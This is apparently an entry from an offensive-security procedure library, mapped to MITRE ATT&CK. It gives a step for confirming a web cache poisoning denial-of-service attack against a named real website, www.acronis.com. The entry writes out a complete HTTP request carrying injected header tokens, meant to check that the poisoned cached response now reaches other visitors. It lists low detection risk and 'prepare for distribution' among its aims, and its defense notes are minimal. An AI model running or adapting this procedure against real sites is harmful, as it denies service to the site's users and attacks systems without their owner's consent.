---
tags:
  - web-cache-poisoning
  - dos
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/clean-request-confirm-poisoning]]'
platforms:
  - Web
techniques:
  - '[[Endpoint Denial of Service]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 9bb13652-78c2-40b5-88d5-a7a11896b8e0
created_at: '2025-12-13T09:00:34.216Z'
updated_at: '2025-12-13T09:00:34.216Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Confirm Cache Poisoning

## Summary

This procedure sends a clean HTTP request to the targeted endpoint to verify if the cache has been successfully poisoned, confirming the pollution by observing the altered response.

## Description

After initial poisoning, a standard request without modifications is sent to hit the cache. If the response is poisoned (e.g., broken resources), it confirms the attack's success, leading to DoS for subsequent users.

## Requirements

1. Prior poisoning step completed
2. Access to www.acronis.com
3. HTTP client or Burp Suite

## Defense

Defensive measures and detection strategies:

- Use cache invalidation mechanisms
- Detect repeated anomalous requests

## Objectives

1. Verify cache pollution
2. Confirm DoS potential
3. Prepare for distribution

## Instructions

### Step 1: Send Clean Request

**Context**: Remove poisoning parameters and send to hit the cache.

**Command** ([[commands/clean-request-confirm-poisoning]]):
```bash
GET /zh-cn/careers/ HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
```

> Sends a clean GET request; repeat if needed to confirm poisoned response.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques



## Commands Used

- [[commands/clean-request-confirm-poisoning]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- web-cache-poisoning
- dos
